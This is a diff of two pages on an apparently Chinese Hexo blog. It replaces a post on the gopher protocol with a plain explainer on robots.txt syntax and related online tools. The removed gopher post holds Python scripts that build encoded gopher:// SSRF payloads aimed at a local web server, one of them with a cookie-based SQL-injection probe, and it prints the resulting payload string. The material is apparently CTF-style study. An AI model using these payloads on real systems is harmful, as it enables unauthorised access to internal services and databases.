@@ -7,10 +7,10 @@
 
     
 
-    <title>gopher协议 | Hexo</title>
+    <title>robots.txt文件 | Hexo</title>
     <meta name="author" content="John Doe" />
     <meta name="keywords" content="" />
-    <meta name="description" content="编写payload脚本，实现内部访问：import urllib.parsehost &amp;#x3D; “127.0.0.1:80”content &amp;#x3D; “uname&amp;#x3D;admin&amp;amp;passwd&amp;#x3D;admin”content_length &amp;#x3D; len(content)test &amp;#x3D;“””POST &amp;#x2F;index.php HTTP&amp;#x2F;1.1Host: {}User-Agent: curl&amp;#x2F;7.43.0Accept: &amp;#x2F" />
+    <meta name="description" content="一、robots.txt文件Robots.txt文件是网站跟爬虫间的协议，对于专业SEO并不陌生，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。如您的网站未设置robots协议，搜索引擎对网站视" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
 
@@ -94,7 +94,7 @@
         
 
         
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99payload%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%86%85%E9%83%A8%E8%AE%BF%E9%97%AE%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">编写payload脚本，实现内部访问：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E7%9A%84%E6%84%8F%E6%80%9D%E5%B0%B1%E6%98%AF%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%8C%E7%94%A8gopher%E5%8D%8F%E8%AE%AE%E5%8F%91%E9%80%81"><span class="toc-number">1.1.</span> <span class="toc-text">这个脚本的意思就是构造一个数据包，用gopher协议发送</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8C%85%E8%8E%B7%E5%8F%96"><span class="toc-number">1.1.1.</span> <span class="toc-text">抓包获取</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81robots-txt%E6%96%87%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">一、robots.txt文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Robots-txt%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%99%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">二、Robots.txt文件的写法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%9C%A8%E7%BA%BF%E7%94%9F%E6%88%90Robots-txt-%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.1.</span> <span class="toc-text">三、在线生成Robots.txt 文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Robots-txt%E5%9C%A8%E7%BA%BF%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">四、Robots.txt在线检测工具</span></a></li></ol></li></ol></li></ol></li></ol>
         
     </div>
 </aside>
@@ -108,15 +108,15 @@
     <header class="article-header">
         
         <h1 itemprop="name">
-            gopher协议
+            robots.txt文件
         </h1>
         
         <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/2023/07/01/gopher%E5%8D%8F%E8%AE%AE/index.html">
+            <a class="article-date" href="http://example.com/2023/07/05/robots-txt%E6%96%87%E4%BB%B6/index.html">
     
     <i class="icon-calendar vm"></i>
     
-    <time class="vm" datetime="2023-07-01T12:52:25.000Z" itemprop="datePublished">2023-07-01</time>
+    <time class="vm" datetime="2023-07-05T08:14:30.000Z" itemprop="datePublished">2023-07-05</time>
 </a>
 
             
@@ -126,20 +126,28 @@
     
     <section class="article-body markdown-body">
         
-        <h1 id="编写payload脚本，实现内部访问："><a href="#编写payload脚本，实现内部访问：" class="headerlink" title="编写payload脚本，实现内部访问："></a>编写payload脚本，实现内部访问：</h1><p><em>import urllib.parse</em></p>
-<p>host &#x3D; “127.0.0.1:80”<br>content &#x3D; “uname&#x3D;admin&amp;passwd&#x3D;admin”<br>content_length &#x3D; len(content)</p>
-<p>test &#x3D;<br>“””POST &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>User-Agent: curl&#x2F;7.43.0<br>Accept: <em>&#x2F;</em><br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: {}</p>
-<p>{}<br>“””.format(host,content_length,content)<br>&#x2F;&#x2F;按照标准，URL只允许一部分ASCII字符，其他字符（如汉字）是不符合标准的，此时就要进行编码。<br>因为我在构造URL的过程中要使用到中文：此时需要用到urllib.parse.quote，此处是为了替换特殊字符<br>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
-<h2 id="这个脚本的意思就是构造一个数据包，用gopher协议发送"><a href="#这个脚本的意思就是构造一个数据包，用gopher协议发送" class="headerlink" title="这个脚本的意思就是构造一个数据包，用gopher协议发送"></a>这个脚本的意思就是构造一个数据包，用gopher协议发送</h2><p>运行脚本获得payload如下：gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520&#x2F;index.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl&#x2F;7.43.0%250D%250AAccept%253A%2520%252A&#x2F;%252A%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%250D%250A</p>
-<h3 id="抓包获取"><a href="#抓包获取" class="headerlink" title="抓包获取"></a>抓包获取</h3><ol>
-<li>可以发现setcookie的值为admin的base64编码值。</li>
+        <h1 id="一、robots-txt文件"><a href="#一、robots-txt文件" class="headerlink" title="一、robots.txt文件"></a>一、robots.txt文件</h1><ol>
+<li><p>Robots.txt文件是网站跟爬虫间的协议，对于专业SEO并不陌生，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p>
+</li>
+<li><p>如您的网站未设置robots协议，搜索引擎对网站视频URL的收录将包含视频播放页URL，及页面中的视频文件、视频周边文本等信息，搜索对已收录的短视频资源将对用户呈现为视频极速体验页。此外，综艺影视类长视频，搜索引擎仅收录页面URL。</p>
+</li>
 </ol>
-<p>猜测在setcookie处为注入点，首先测试是字符型还是整数型注入，构造payload为admin’ #<br>构造脚本</p>
-<p>import urllib.parse</p>
-<p>host &#x3D; “127.0.0.1:80”<br>cookie&#x3D;”this_is_your_cookie&#x3D;YWRtaW4nICM&#x3D;”</p>
-<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
-<p>“””.format(host,cookie)</p>
-<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
+<hr>
+<p><strong>User-agent:</strong><br>该项的值用于描述搜索引擎robot的名字，在”robots.txt”文件中，如果有多条User-agent记录说明有多个robot会受到该协议的限制，对该文件来说，至少要有一条User-agent记录。如果该项的值设为*，则该协议对任何机器人均有效，在”robots.txt”文件中，”User-agent:*”这样的记录只能有一条。<br><strong>Disallow:</strong><br>该项的值用于描述不希望被访问到的一个URL，这个URL可以是一条完整的路径，也可以是部分的，任何以Disallow开头的URL均不会被robot访问到。例如”Disallow:&#x2F;help”对&#x2F;help.html 和&#x2F;help&#x2F;index.html都不允许搜索引擎访问，而”Disallow:&#x2F;help&#x2F;”则允许robot访问&#x2F;help.html，而不能访问&#x2F;help&#x2F;index.html。任何一条Disallow记录为空，说明该网站的所有部分都允许被访问，在”&#x2F;robots.txt”文件中，至少要有一条Disallow记录。如果”&#x2F;robots.txt”是一个空文件，则对于所有的搜索引擎robot，该网站都是开放的。<br><strong>Allow:</strong><br>该项的值用于描述希望被访问的一组URL，与Disallow项相似，这个值可以是一条完整的路径，也可以是路径的前缀，以Allow项的值开头的URL是允许robot访问的。例如”Allow:&#x2F;hibaidu”允许robot访问&#x2F;hibaidu.htm、&#x2F;hibaiducom.html、&#x2F;hibaidu&#x2F;com.html。一个网站的所有URL默认是Allow的，所以Allow通常与Disallow搭配使用，实现允许访问一部分网页同时禁止访问其它所有URL的功能。<br>需要特别注意的是Disallow与Allow行的顺序是有意义的，robot会根据第一个匹配成功的Allow或Disallow行确定是否访问某个URL。</p>
+<p><em>使用”</em>”和”$”：*<br>robots支持使用通配符”<em>”和”$”来模糊匹配url：<br>“$” 匹配行结束符。<br>“</em>” 匹配0或多个任意字符。</p>
+<h2 id="二、Robots-txt文件的写法"><a href="#二、Robots-txt文件的写法" class="headerlink" title="二、Robots.txt文件的写法"></a>二、Robots.txt文件的写法</h2><ul>
+<li>User-agent: *   (头部标准)</li>
+<li>Allow: &#x2F;        （允许全部搜索引擎捉取）</li>
+<li>User-agent: Googlebot (谷歌蜘蛛)</li>
+<li>Disallow:       （默认捉取）</li>
+<li>User-agent: Baiduspider (百度蜘蛛)</li>
+<li>Disallow: &#x2F;      （禁止捉取）</li>
+<li>Sitemap: <a target="_blank" rel="noopener" href="https://www.l.cn/sitemap.xml">https://www.l.cn/sitemap.xml</a>  （站点地图）</li>
+</ul>
+<h3 id="三、在线生成Robots-txt-文件"><a href="#三、在线生成Robots-txt-文件" class="headerlink" title="三、在线生成Robots.txt 文件"></a>三、在线生成Robots.txt 文件</h3><p>站长工具Robots.txt生成：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/robots/">http://tool.chinaz.com/robots/</a><br>便民查询网Robots.txt生成器：<a target="_blank" rel="noopener" href="https://robots.51240.com/">https://robots.51240.com/</a><br>Tool在线工具：<a target="_blank" rel="noopener" href="https://www.qtool.net/robots">https://www.qtool.net/robots</a></p>
+<h4 id="四、Robots-txt在线检测工具"><a href="#四、Robots-txt在线检测工具" class="headerlink" title="四、Robots.txt在线检测工具"></a>四、Robots.txt在线检测工具</h4><p>当写好robots.txt文件就需要检测是否有写，下面提供几款在线工具帮助大家检测robots是否有写错。</p>
+<p>爱站Robots.txt检测工具：<a target="_blank" rel="noopener" href="https://tools.aizhan.com/robots/">https://tools.aizhan.com/robots/</a></p>
+<p>站长工具Robots.txt检测：<a target="_blank" rel="noopener" href="http://s.tool.chinaz.com/robots/">http://s.tool.chinaz.com/robots/</a></p>
 
         
     </section>
@@ -157,10 +165,10 @@
         repo: "sanonz.github.io",
         owner: "sanonz",
         admin: ["sanonz"],
-        id: "acb298bed25a8112a7dd978396644306",
+        id: "32b50396b1dff86f5049336cf8e30b08",
         distractionFreeMode: true,
-        title: "gopher协议",
-        body: "http://example.com/2023/07/01/gopher%E5%8D%8F%E8%AE%AE/",
+        title: "robots.txt文件",
+        body: "http://example.com/2023/07/05/robots-txt%E6%96%87%E4%BB%B6/",
         labels: []
     }).render('comments');
     </script>
@@ -173,10 +181,8 @@
 
         
             
-            <a id="pagenext" href="/2023/06/29/ssrf%E8%AF%A6%E8%A7%A3/" class="article-next" title="ssrf详解"><i class="icon-arrow-right"></i></a>
+            <a id="pagenext" href="/2023/07/01/gopher%E5%8D%8F%E8%AE%AE/" class="article-next" title="gopher协议"><i class="icon-arrow-right"></i></a>
             
-            
-            <a id="pageprev" href="/2023/07/05/robots-txt%E6%96%87%E4%BB%B6/" class="article-prev" title="robots.txt文件"><i class="icon-arrow-left"></i></a>
             
         
 
